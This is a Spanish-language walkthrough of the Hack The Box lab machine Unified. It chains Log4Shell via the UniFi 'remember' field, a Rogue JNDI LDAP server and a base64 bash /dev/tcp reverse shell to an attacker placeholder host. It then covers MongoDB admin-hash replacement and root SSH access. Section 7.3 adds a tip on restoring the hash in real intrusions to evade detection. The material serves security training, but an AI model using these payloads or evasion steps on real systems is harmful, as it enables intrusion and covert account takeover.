# Manual Técnico: Hack The Box — Máquina Unified
### Explotación de Log4Shell (CVE-2021-44228), LDAP Malicioso, MongoDB y Escalada de Privilegios en Entornos Linux

---

## Tabla de Contenidos

1. [Introducción y Contexto](#1-introducción-y-contexto)
2. [Reconocimiento y Enumeración](#2-reconocimiento-y-enumeración)
   - 2.1 [Escaneo de Puertos con Nmap](#21-escaneo-de-puertos-con-nmap)
   - 2.2 [Identificación del Servicio en Puerto 8443](#22-identificación-del-servicio-en-puerto-8443)
3. [Análisis de la Aplicación Web](#3-análisis-de-la-aplicación-web)
   - 3.1 [Acceso al Panel Web de UniFi Network](#31-acceso-al-panel-web-de-unifi-network)
   - 3.2 [Identificación de la Versión Vulnerable](#32-identificación-de-la-versión-vulnerable)
4. [Vulnerabilidad: Log4Shell (CVE-2021-44228)](#4-vulnerabilidad-log4shell-cve-2021-44228)
   - 4.1 [Concepto Teórico: Log4j y JNDI](#41-concepto-teórico-log4j-y-jndi)
   - 4.2 [Verificación de la Vulnerabilidad con TCPDump](#42-verificación-de-la-vulnerabilidad-con-tcpdump)
   - 4.3 [Intercepción de la Petición con BurpSuite](#43-intercepción-de-la-petición-con-burpsuite)
5. [Explotación: Reverse Shell mediante Rogue JNDI](#5-explotación-reverse-shell-mediante-rogue-jndi)
   - 5.1 [Concepto Teórico: Servidor LDAP Malicioso](#51-concepto-teórico-servidor-ldap-malicioso)
   - 5.2 [Instalación y Configuración de Rogue JNDI](#52-instalación-y-configuración-de-rogue-jndi)
   - 5.3 [Preparación del Payload en Base64](#53-preparación-del-payload-en-base64)
   - 5.4 [Lanzamiento del Ataque](#54-lanzamiento-del-ataque)
6. [Post-Explotación: Enumeración de MongoDB](#6-post-explotación-enumeración-de-mongodb)
   - 6.1 [Identificación del Puerto de MongoDB](#61-identificación-del-puerto-de-mongodb)
   - 6.2 [Conexión a la Base de Datos](#62-conexión-a-la-base-de-datos)
   - 6.3 [Enumeración de Bases de Datos y Usuarios](#63-enumeración-de-bases-de-datos-y-usuarios)
7. [Escalada de Privilegios: Modificación de Credenciales en MongoDB](#7-escalada-de-privilegios-modificación-de-credenciales-en-mongodb)
   - 7.1 [Identificación del Tipo de Hash](#71-identificación-del-tipo-de-hash)
   - 7.2 [Generación de un Hash SHA-512 con mkpasswd](#72-generación-de-un-hash-sha-512-con-mkpasswd)
   - 7.3 [Modificación del Usuario Administrador](#73-modificación-del-usuario-administrador)
8. [Acceso al Panel de Administración y Obtención de Credenciales SSH](#8-acceso-al-panel-de-administración-y-obtención-de-credenciales-ssh)
9. [Acceso Remoto por SSH y Captura de Flags](#9-acceso-remoto-por-ssh-y-captura-de-flags)
10. [Resumen de Puntos Clave](#10-resumen-de-puntos-clave)
11. [Inventario Final de Herramientas](#11-inventario-final-de-herramientas)

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 1. Introducción y Contexto

La máquina **Unified** de Hack The Box es un entorno de práctica basado en **Linux** que requiere la explotación encadenada de múltiples vulnerabilidades. Se trata de la última máquina del nivel Tier 2 de los Starting Points, e introduce técnicas de mayor complejidad respecto a las máquinas anteriores, incluyendo inyección JNDI, manipulación de servidores LDAP y modificación directa de bases de datos NoSQL.

Las vulnerabilidades y técnicas explotadas en esta máquina son:

- **Log4Shell (CVE-2021-44228):** vulnerabilidad crítica en la librería Apache Log4j que permite inyectar y ejecutar código de forma remota mediante cadenas JNDI maliciosas.
- **Rogue JNDI:** herramienta que levanta un servidor LDAP controlado por el atacante para interceptar y responder a las solicitudes JNDI inyectadas.
- **Reverse Shell codificada en Base64:** técnica para evadir restricciones de parsing en el intérprete de comandos del servidor víctima.
- **Manipulación de MongoDB:** acceso y modificación directa de la base de datos de la aplicación para cambiar credenciales de administrador.
- **Acceso SSH con credenciales obtenidas:** obtención de acceso root al sistema mediante las credenciales extraídas del panel de administración.

El flujo de ataque sigue la metodología estándar de pruebas de penetración: reconocimiento → enumeración → identificación de vulnerabilidades → explotación → post-explotación → escalada de privilegios → captura de flags.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 2. Reconocimiento y Enumeración

### 2.1 Escaneo de Puertos con Nmap

Se realiza un escaneo de los puertos principales con detección de versiones y ejecución de scripts básicos de Nmap.

```bash
nmap -sV -sC --min-rate 5000 <IP_OBJETIVO> -oN escaneo_unified
```

**Descripción de los parámetros:**

| Flag              | Descripción                                                                      |
|-------------------|----------------------------------------------------------------------------------|
| `-sV`             | Detecta versiones de los servicios en ejecución.                                 |
| `-sC`             | Ejecuta los scripts NSE (Nmap Scripting Engine) por defecto.                     |
| `--min-rate 5000` | Establece una tasa mínima de 5000 paquetes por segundo para acelerar el escaneo. |
| `<IP_OBJETIVO>`   | Dirección IP del sistema objetivo.                                               |
| `-oN escaneo_unified` | Guarda la salida en formato normal en el archivo especificado.               |

**Puertos relevantes identificados:**

| Puerto | Servicio           | Descripción                                                               |
|--------|--------------------|---------------------------------------------------------------------------|
| 22     | SSH                | Acceso remoto por línea de comandos. Relevante en fases de post-explotación. |
| 6789   | TCP (desconocido)  | Puerto de servicio de UniFi. Sin relevancia directa inicial.              |
| 8080   | HTTP               | Servidor web que redirige al puerto 8443.                                 |
| 8443   | HTTPS              | Panel de administración web de UniFi Network.                             |
| 8843   | HTTPS (alternativo)| Puerto adicional del servicio UniFi.                                      |

> **Buena práctica:** todos los puertos activos deben registrarse y evaluarse como vectores de ataque potenciales, aunque en primera instancia parezcan irrelevantes.

**Resumen de puntos clave — Sección 2:**
- El flag `-oN` de Nmap guarda la salida para referencia posterior; su uso es recomendable en toda auditoría.
- El puerto 8080 redirige automáticamente al 8443, donde se aloja el panel de administración HTTPS.
- El puerto 22 (SSH) es relevante en fases avanzadas del ataque una vez obtenidas credenciales válidas.

---

### 2.2 Identificación del Servicio en Puerto 8443

Al acceder al puerto 8080 mediante el navegador, el servidor ejecuta una redirección automática hacia `https://<IP_OBJETIVO>:8443`. En este puerto se encuentra alojado el panel web de **UniFi Network**, cuya versión queda visible en la interfaz de inicio de sesión.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 3. Análisis de la Aplicación Web

### 3.1 Acceso al Panel Web de UniFi Network

El servicio accesible en el puerto 8443 corresponde al software **UniFi Network**, una solución de gestión de red desarrollada por Ubiquiti. La versión del software se muestra directamente en el logotipo y en el pie de la página de login.

> **Herramienta recomendada:** la extensión de navegador **Wappalyzer** permite identificar automáticamente el stack tecnológico de una aplicación web (lenguajes, frameworks, CMS, etc.) sin necesidad de análisis manual.

---

### 3.2 Identificación de la Versión Vulnerable

La versión identificada en el panel de UniFi Network es susceptible a la vulnerabilidad conocida como **Log4Shell**, catalogada como **CVE-2021-44228**. Esta vulnerabilidad, también denominada **Log4J RCE**, afecta a múltiples versiones de UniFi y permite la ejecución remota de código a través del campo `remember` del formulario de autenticación.

**Método de búsqueda recomendado:** buscar en internet el CVE junto con el nombre del software y añadir el término `POC GitHub` para localizar repositorios con scripts de prueba de concepto desarrollados por la comunidad.

```
UniFi <versión> CVE-2021-44228 POC GitHub
```

**Resumen de puntos clave — Sección 3:**
- La versión del software web puede identificarse visualmente en el propio panel de login.
- Buscar el CVE asociado con el término `POC GitHub` acelera la localización de scripts de explotación funcionales.
- El campo vulnerable es el parámetro `remember` del formulario de autenticación de UniFi.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 4. Vulnerabilidad: Log4Shell (CVE-2021-44228)

### 4.1 Concepto Teórico: Log4j y JNDI

**Log4j** es una librería de logging ampliamente utilizada en aplicaciones Java desarrollada por Apache. La vulnerabilidad **Log4Shell** reside en la forma en que versiones específicas de Log4j procesan determinadas cadenas de texto: al registrar un valor que contiene una referencia JNDI, el servidor interpreta y ejecuta dicha referencia en lugar de tratarla como texto plano.

**JNDI (Java Naming and Directory Interface)** es una API de Java que permite a las aplicaciones acceder a servicios de directorio, entre ellos **LDAP (Lightweight Directory Access Protocol)**. El puerto estándar de LDAP es el **389**.

**Flujo de la vulnerabilidad:**

1. El atacante inyecta en un campo de entrada procesado por Log4j una cadena con la estructura: `${jndi:ldap://<IP_ATACANTE>/<ruta>}`.
2. El servidor víctima, al registrar ese valor con Log4j, interpreta la referencia JNDI y establece una conexión LDAP hacia la IP del atacante.
3. Si el atacante controla el servidor LDAP de destino, puede responder con un payload malicioso que el servidor víctima ejecutará.

---

### 4.2 Verificación de la Vulnerabilidad con TCPDump

Antes de lanzar el ataque completo, se verifica que el servidor procesa la inyección JNDI levantando un listener en el puerto 389 con TCPDump.

```bash
sudo tcpdump -i tun0 port 389
```

**Descripción de los parámetros:**

| Flag       | Descripción                                                                 |
|------------|-----------------------------------------------------------------------------|
| `tcpdump`  | Herramienta de captura e inspección de tráfico de red.                      |
| `-i tun0`  | Especifica la interfaz de red a monitorizar. `tun0` es la interfaz de la VPN de Hack The Box. |
| `port 389` | Filtra el tráfico para mostrar únicamente paquetes en el puerto 389 (LDAP). |

Si tras enviar el payload JNDI desde BurpSuite se observa una conexión entrante en TCPDump, la vulnerabilidad queda confirmada.

---

### 4.3 Intercepción de la Petición con BurpSuite

Se intercepta la petición de autenticación al panel de UniFi utilizando **BurpSuite** como proxy HTTP, con el complemento **FoxyProxy** configurado en el navegador.

**Pasos:**

1. Activar el proxy en FoxyProxy apuntando a `127.0.0.1:8080`.
2. En el formulario de login, introducir cualquier valor en usuario y contraseña, y marcar la casilla **Remember Me**.
3. Interceptar la petición en BurpSuite y enviarla al **Repeater** (`Ctrl+R`).
4. En el Repeater, localizar el parámetro `remember` en el cuerpo de la petición.

La estructura de la petición interceptada contiene, entre otros, el atributo:
```
"remember": "test"
```

Este atributo es el punto de inyección del payload Log4Shell.

**Payload de verificación JNDI:**
```
${jndi:ldap://<IP_ATACANTE>/test}
```

**Resumen de puntos clave — Sección 4:**
- Log4Shell permite ejecutar código remoto inyectando referencias JNDI en campos procesados por Log4j.
- El protocolo implicado es LDAP (puerto 389); TCPDump permite verificar la conectividad antes de explotar.
- El campo vulnerable en UniFi es el parámetro `remember` del formulario de autenticación.
- BurpSuite y FoxyProxy son las herramientas estándar para interceptar y modificar peticiones HTTP/HTTPS.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 5. Explotación: Reverse Shell mediante Rogue JNDI

### 5.1 Concepto Teórico: Servidor LDAP Malicioso

Una vez confirmada la vulnerabilidad, el siguiente paso es aprovechar que el servidor víctima establece conexiones LDAP hacia el atacante para inyectar y ejecutar una reverse shell.

Para ello se utiliza **Rogue JNDI**, una herramienta de Java disponible en GitHub que levanta un servidor LDAP controlado por el atacante. Cuando el servidor víctima conecta con dicho servidor LDAP (a través de la inyección JNDI), Rogue JNDI responde ejecutando una cadena de comandos arbitraria en la máquina víctima.

El flujo completo es:

1. Rogue JNDI levanta un servidor LDAP en el puerto **1389** de la máquina atacante.
2. El atacante inyecta en el parámetro vulnerable la cadena JNDI apuntando a ese servidor.
3. El servidor víctima establece la conexión LDAP con Rogue JNDI.
4. Rogue JNDI responde con el payload preconfigurado, que en la máquina víctima ejecuta una reverse shell.
5. La reverse shell conecta de vuelta a un listener Netcat/Penelope en la máquina atacante.

---

### 5.2 Instalación y Configuración de Rogue JNDI

**Descarga del repositorio:**

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
```

**Descripción del comando:**

| Elemento     | Descripción                                                              |
|--------------|--------------------------------------------------------------------------|
| `git clone`  | Descarga una copia del repositorio remoto en el directorio actual.       |
| `cd`         | Cambia el directorio de trabajo al repositorio descargado.               |

**Instalación de dependencias (Maven):**

Maven es la herramienta de construcción de proyectos Java utilizada por Rogue JNDI.

```bash
sudo apt install maven -y
```

**Construcción del proyecto:**

```bash
mvn package -q
```

**Descripción de los parámetros:**

| Elemento      | Descripción                                                                  |
|---------------|------------------------------------------------------------------------------|
| `mvn`         | Ejecuta Maven, la herramienta de construcción de proyectos Java.             |
| `package`     | Compila el proyecto y genera el archivo `.jar` ejecutable en la carpeta `target/`. |
| `-q`          | Modo silencioso; suprime la salida informativa del proceso de compilación.   |

Tras la compilación, el archivo ejecutable se ubica en `target/RogueJndi-1.1.jar`.

---

### 5.3 Preparación del Payload en Base64

La reverse shell debe codificarse en Base64 antes de incluirse en el comando de Rogue JNDI. Esto se debe a que el servidor interpreta el payload mediante Java, y la codificación evita problemas de parsing con caracteres especiales.

**Cadena de reverse shell (bash):**

```bash
bash -i >& /dev/tcp/<IP_ATACANTE>/<PUERTO> 0>&1
```

**Codificación en Base64 con CyberChef o mediante terminal:**

```bash
echo -n 'bash -i >& /dev/tcp/<IP_ATACANTE>/<PUERTO> 0>&1' | base64
```

> **Advertencia:** la cadena Base64 depende de la IP y el puerto del atacante. No debe copiarse de fuentes externas sin adaptar estos valores a la configuración propia.

---

### 5.4 Lanzamiento del Ataque

**Paso 1 — Iniciar el listener de reverse shell:**

```bash
nc -lvnp <PUERTO>
```

| Flag  | Descripción                                                   |
|-------|---------------------------------------------------------------|
| `-l`  | Modo escucha (listen).                                        |
| `-v`  | Modo verboso; muestra información detallada de la conexión.   |
| `-n`  | No resuelve nombres DNS.                                      |
| `-p`  | Especifica el puerto en el que se quedará en escucha.         |

**Paso 2 — Lanzar Rogue JNDI con el payload:**

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<BASE64>}|{base64,-d}|bash -i" --hostname "<IP_ATACANTE>"
```

**Descripción de los parámetros:**

| Parámetro      | Descripción                                                                                     |
|----------------|-------------------------------------------------------------------------------------------------|
| `-jar`         | Indica a Java que ejecute un archivo `.jar`.                                                    |
| `--command`    | Cadena de comandos que el servidor LDAP inyectará en la máquina víctima al ser contactado.      |
| `echo,<BASE64>`| Imprime la cadena Base64 de la reverse shell.                                                   |
| `base64,-d`    | Decodifica la cadena Base64.                                                                    |
| `bash -i`      | Ejecuta el resultado decodificado, estableciendo una terminal interactiva.                      |
| `--hostname`   | IP de la máquina atacante, utilizada como destino de la reverse shell.                          |

Rogue JNDI levantará dos servicios:
- Servidor HTTP en el puerto `8000`.
- Servidor LDAP malicioso en el puerto `1389`.

**Paso 3 — Inyectar el payload desde BurpSuite Repeater:**

Modificar el valor del parámetro `remember` en la petición interceptada:

```
${jndi:ldap://<IP_ATACANTE>:1389/o=tomcat}
```

| Elemento               | Descripción                                                                                    |
|------------------------|------------------------------------------------------------------------------------------------|
| `${jndi:ldap://...}`   | Cadena de inyección Log4Shell. Log4j la interpreta como una referencia JNDI a resolver.        |
| `<IP_ATACANTE>:1389`   | IP y puerto del servidor LDAP malicioso levantado por Rogue JNDI.                              |
| `/o=tomcat`            | Ruta del objeto LDAP. Se especifica `tomcat` porque el servidor web backend utiliza Apache Tomcat. |

Al enviar la petición, la máquina víctima contacta el servidor LDAP de Rogue JNDI, que inyecta el payload y establece la reverse shell en el listener Netcat.

**Resumen de puntos clave — Sección 5:**
- Rogue JNDI levanta un servidor LDAP malicioso que ejecuta comandos arbitrarios en el servidor que lo contacta.
- El payload de reverse shell debe codificarse en Base64 para evitar errores de interpretación en Java.
- La ruta LDAP debe terminar en `/o=tomcat` cuando el servidor web utiliza Apache Tomcat como backend.
- El puerto del servidor LDAP de Rogue JNDI es el 1389, distinto del LDAP estándar (389).

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 6. Post-Explotación: Enumeración de MongoDB

### 6.1 Identificación del Puerto de MongoDB

Una vez obtenida la reverse shell, se identifican los procesos en ejecución en la máquina víctima para localizar el servicio de base de datos.

```bash
ps aux | grep mongo
```

**Descripción de los parámetros:**

| Elemento  | Descripción                                                                          |
|-----------|--------------------------------------------------------------------------------------|
| `ps aux`  | Lista todos los procesos en ejecución del sistema con información detallada.         |
| `\|`      | Operador pipe; redirige la salida del comando anterior como entrada al siguiente.    |
| `grep mongo` | Filtra las líneas que contienen la cadena `mongo`, mostrando únicamente los procesos relacionados. |

El resultado indica que MongoDB está ejecutándose en el puerto **27117**, distinto del puerto estándar (27017).

---

### 6.2 Conexión a la Base de Datos

```bash
mongo --port 27117
```

**Descripción de los parámetros:**

| Flag       | Descripción                                                                          |
|------------|--------------------------------------------------------------------------------------|
| `mongo`    | Cliente de línea de comandos de MongoDB.                                             |
| `--port`   | Especifica el puerto al que conectarse. Necesario cuando MongoDB no corre en el puerto estándar 27017. |

---

### 6.3 Enumeración de Bases de Datos y Usuarios

**Listar las bases de datos disponibles:**

```
show databases
```

La única base de datos con contenido es **ace**, que corresponde a la base de datos de la aplicación UniFi.

**Seleccionar la base de datos:**

```
use ace
```

**Enumerar todos los documentos de la colección admin:**

```
db.admin.find()
```

**Descripción del comando:**

| Elemento        | Descripción                                                                        |
|-----------------|------------------------------------------------------------------------------------|
| `db`            | Referencia a la base de datos actualmente seleccionada.                            |
| `.admin`        | Colección de la base de datos que contiene los documentos de usuarios administradores. |
| `.find()`       | Función que devuelve todos los documentos de la colección especificada.            |

El resultado muestra los atributos del usuario administrador, entre ellos el campo `x_shadow`, que contiene el hash de su contraseña.

**Resumen de puntos clave — Sección 6:**
- El puerto de MongoDB puede diferir del estándar (27017); debe identificarse mediante `ps aux`.
- La sintaxis de MongoDB es similar a MySQL: `show databases`, `use <db>`, `db.<colección>.find()`.
- La base de datos de UniFi se denomina `ace` y almacena los hashes de contraseña en el atributo `x_shadow`.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 7. Escalada de Privilegios: Modificación de Credenciales en MongoDB

### 7.1 Identificación del Tipo de Hash

El hash almacenado en el atributo `x_shadow` comienza con el prefijo `$6$`, que identifica inequívocamente el algoritmo de hashing utilizado.

**Tabla de identificación de hashes por prefijo:**

| Prefijo | Algoritmo  | Modo Hashcat |
|---------|------------|--------------|
| `$1$`   | MD5        | 500          |
| `$5$`   | SHA-256    | 7400         |
| `$6$`   | SHA-512    | 1800         |

El hash de UniFi utiliza **SHA-512** (modo `1800` en Hashcat).

> **Nota:** el prefijo del hash es el método más fiable para identificar el algoritmo. Herramientas automáticas como `hash-identifier` pueden producir resultados incorrectos; siempre debe validarse el resultado consultando una referencia de modos de Hashcat.

---

### 7.2 Generación de un Hash SHA-512 con mkpasswd

Dado que el hash del administrador no puede crackearse con diccionario, la estrategia consiste en generar un nuevo hash SHA-512 para una contraseña conocida y reemplazar el valor almacenado en la base de datos.

```bash
mkpasswd -m sha-512 <NUEVA_CONTRASEÑA>
```

**Descripción de los parámetros:**

| Elemento          | Descripción                                                                          |
|-------------------|--------------------------------------------------------------------------------------|
| `mkpasswd`        | Utilidad de Linux para generar hashes de contraseñas en distintos formatos.          |
| `-m sha-512`      | Especifica el algoritmo de hashing. Debe coincidir con el formato almacenado en la base de datos. |
| `<NUEVA_CONTRASEÑA>` | Contraseña en texto claro para la que se generará el hash.                        |

El hash generado comenzará con el prefijo `$6$`, confirmando que el formato es compatible con el almacenado en MongoDB.

---

### 7.3 Modificación del Usuario Administrador

Con el hash generado, se actualiza el atributo `x_shadow` del usuario administrador en la base de datos.

```
db.admin.update({"_id": ObjectId("<ID_DEL_USUARIO>")}, {$set: {"x_shadow": "<HASH_GENERADO>"}})
```

**Descripción de los parámetros:**

| Elemento                    | Descripción                                                                               |
|-----------------------------|-------------------------------------------------------------------------------------------|
| `db.admin.update()`         | Función de MongoDB para actualizar documentos en la colección `admin`.                    |
| `{"_id": ObjectId(...)}`    | Primer argumento: filtro de búsqueda que identifica el documento a modificar por su ID.   |
| `{$set: {"x_shadow": ...}}` | Segundo argumento: operación de actualización; reemplaza el valor del atributo especificado. |
| `<ID_DEL_USUARIO>`          | Valor del campo `_id` del usuario administrador, obtenido del resultado de `db.admin.find()`. |
| `<HASH_GENERADO>`           | Hash SHA-512 generado con `mkpasswd` en el paso anterior.                                 |

Una respuesta `WriteResult({ "nMatched": 1, "nUpserted": 0, "nModified": 1 })` confirma que el documento fue localizado y modificado correctamente.

> **Nota operacional:** en un entorno real, una vez completadas las acciones requeridas, es recomendable restaurar el hash original del usuario para minimizar el rastro del ataque y evitar la detección.

**Resumen de puntos clave — Sección 7:**
- El prefijo `$6$` identifica un hash SHA-512; el modo correspondiente en Hashcat es `1800`.
- Si el hash no es crackeable, la alternativa es reemplazarlo por uno de conocido mediante `db.admin.update()`.
- `mkpasswd -m sha-512` genera hashes compatibles con el formato de almacenamiento de UniFi.
- La función `db.admin.update()` es el equivalente MongoDB de `UPDATE` en SQL.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 8. Acceso al Panel de Administración y Obtención de Credenciales SSH

Con las credenciales del administrador modificadas, se accede al panel web de UniFi Network en `https://<IP_OBJETIVO>:8443` utilizando el nombre de usuario `administrator` y la nueva contraseña establecida.

> **Importante:** si las credenciales no funcionan inmediatamente tras la modificación en MongoDB, recargar la página del navegador antes de volver a intentarlo.

Una vez dentro del panel, se navega a la sección de configuración del sistema:

**Ruta:** `Settings → System → SSH`

En esta sección se encuentra habilitado el acceso SSH para el usuario **root**, y la contraseña aparece en texto claro mediante el visor de contraseña del formulario. Esta contraseña corresponde al hash SHA-512 almacenado originalmente en el campo `x_shadow` de la base de datos.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 9. Acceso Remoto por SSH y Captura de Flags

Con las credenciales SSH del usuario root obtenidas en el panel de administración, se establece una sesión remota en la máquina víctima.

```bash
ssh root@<IP_OBJETIVO>
```

**Descripción del comando:**

| Elemento        | Descripción                                                                    |
|-----------------|--------------------------------------------------------------------------------|
| `ssh`           | Cliente de acceso remoto seguro mediante el protocolo SSH.                     |
| `root`          | Nombre del usuario con el que se autentica en la máquina remota.               |
| `@<IP_OBJETIVO>`| Dirección IP del sistema al que se conecta.                                    |

Introducir la contraseña obtenida en el paso anterior cuando sea solicitada.

**Captura de las flags:**

```bash
# Flag de usuario (ubicada en el directorio home de un usuario no privilegiado)
cat /home/michael/user.txt

# Flag de root
cat /root/root.txt
```

**Descripción del comando:**

| Elemento   | Descripción                                                                 |
|------------|-----------------------------------------------------------------------------|
| `cat`      | Muestra el contenido de un archivo en la salida estándar de la terminal.    |
| `user.txt` | Archivo que contiene la flag de usuario, requerida para completar la máquina. |
| `root.txt` | Archivo que contiene la flag de root.                                       |

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 10. Resumen de Puntos Clave

**Reconocimiento:**
- El puerto 8080 redirige al 8443, donde se aloja el panel HTTPS de UniFi Network.
- La versión del software es visible en la propia interfaz web y constituye el punto de partida para la búsqueda de CVEs asociados.

**Log4Shell (CVE-2021-44228):**
- La vulnerabilidad permite inyectar referencias JNDI en campos procesados por Log4j, forzando al servidor a establecer conexiones LDAP hacia el atacante.
- El campo vulnerable en UniFi es el parámetro `remember` del formulario de login, interceptable con BurpSuite.
- TCPDump en el puerto 389 permite verificar la conectividad antes de proceder con la explotación completa.

**Rogue JNDI y Reverse Shell:**
- Rogue JNDI levanta un servidor LDAP malicioso (puerto 1389) que inyecta comandos en el servidor víctima al ser contactado.
- El payload de reverse shell debe codificarse en Base64 para evitar errores de parsing en el intérprete Java del servidor.
- La ruta LDAP debe incluir `/o=tomcat` cuando el servidor web utiliza Apache Tomcat.

**Post-Explotación con MongoDB:**
- MongoDB puede ejecutarse en un puerto no estándar; identificable mediante `ps aux | grep mongo`.
- La base de datos de UniFi se denomina `ace` y almacena credenciales hasheadas en el atributo `x_shadow`.
- `db.admin.find()` enumera usuarios; `db.admin.update()` permite modificar atributos de los documentos.

**Escalada de Privilegios:**
- El prefijo `$6$` identifica hashes SHA-512. Consultar la tabla de modos de Hashcat para otros algoritmos.
- Si el hash no es crackeable, la alternativa es sustituirlo por uno de contraseña conocida generado con `mkpasswd`.
- Las credenciales SSH del usuario root se obtienen en texto claro desde el panel de administración web de UniFi.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 11. Inventario Final de Herramientas

| Herramienta / Plataforma | Tipo                  | Descripción                                                                                        | Instalación / Disponibilidad                             |
|--------------------------|-----------------------|----------------------------------------------------------------------------------------------------|----------------------------------------------------------|
| **Nmap**                 | Escáner de red        | Enumeración de puertos, servicios y versiones. Incluye scripts NSE.                                | Preinstalado en Kali Linux                               |
| **BurpSuite**            | Proxy HTTP            | Interceptación, modificación y reenvío de peticiones HTTP/HTTPS. Incluye módulo Repeater.          | Preinstalado en Kali Linux (Community Edition)           |
| **FoxyProxy**            | Extensión navegador   | Gestión de proxies HTTP en el navegador. Redirige el tráfico web hacia BurpSuite.                  | Extensión para Firefox / Chrome                          |
| **Wappalyzer**           | Extensión navegador   | Fingerprinting de tecnologías web (lenguajes, frameworks, CMS, servidores).                        | Extensión para Firefox / Chrome                          |
| **TCPDump**              | Captura de tráfico    | Intercepta y analiza paquetes de red en tiempo real. Usado para verificar conexiones LDAP.         | Preinstalado en Kali Linux                               |
| **Rogue JNDI**           | Servidor LDAP falso   | Levanta un servidor LDAP controlado por el atacante para inyectar comandos via JNDI.               | `git clone https://github.com/veracode-research/rogue-jndi` |
| **Maven (mvn)**          | Construcción Java     | Herramienta de gestión y construcción de proyectos Java. Necesario para compilar Rogue JNDI.       | `sudo apt install maven`                                 |
| **CyberChef**            | Utilidad web          | Herramienta online para codificación/decodificación (Base64, hex, etc.) y operaciones criptográficas. | `https://gchq.github.io/CyberChef`                    |
| **Netcat (nc)**          | Utilidad de red       | Herramienta de red multipropósito. Usada como listener para recibir reverse shells.                | Preinstalado en Kali Linux                               |
| **MongoDB (mongo)**      | Cliente de base de datos | Cliente de línea de comandos para interactuar con bases de datos MongoDB.                       | Nativo en el servidor víctima                            |
| **mkpasswd**             | Generador de hashes   | Utilidad de Linux para generar hashes de contraseña en distintos algoritmos (MD5, SHA-256, SHA-512). | `sudo apt install whois` (incluido en el paquete whois) |
| **Hashcat**              | Cracking              | Recuperación de contraseñas por fuerza bruta con soporte GPU. Admite múltiples tipos de hash.      | Preinstalado en Kali Linux                               |
| **SSH**                  | Acceso remoto         | Protocolo de acceso remoto seguro por línea de comandos. Puerto estándar: 22.                      | Preinstalado en Kali Linux                               |
| **Hack The Box (HTB)**   | Plataforma            | Plataforma de práctica de ciberseguridad con máquinas vulnerables en entornos controlados.         | `https://www.hackthebox.com`                             |
| **VPN (tun0)**           | Red                   | Interfaz de red virtual generada por la VPN de Hack The Box para conectarse al entorno de laboratorio. | Archivo `.ovpn` descargable desde HTB               |
| **Apache Tomcat**        | Servidor web Java     | Servidor de aplicaciones Java identificado en el servidor víctima. Determina la ruta LDAP a utilizar. | Nativo en el servidor víctima                          |
| **LDAP**                 | Protocolo de directorio | Protocolo de acceso a servicios de directorio. Puerto estándar: 389. Vector de inyección JNDI.   | Nativo en entornos corporativos y servidores Java        |
| **JNDI**                 | API Java              | Java Naming and Directory Interface. API que permite a aplicaciones Java acceder a servicios de directorio. | Nativo en entornos Java                            |
| **Log4j**                | Librería Java         | Librería de logging de Apache afectada por CVE-2021-44228 (Log4Shell).                             | Librería incluida en aplicaciones Java vulnerables       |
| **UniFi Network**        | Software de gestión   | Plataforma de gestión de redes de Ubiquiti, vulnerable a Log4Shell en versiones específicas.       | Nativo en el servidor víctima                            |
```
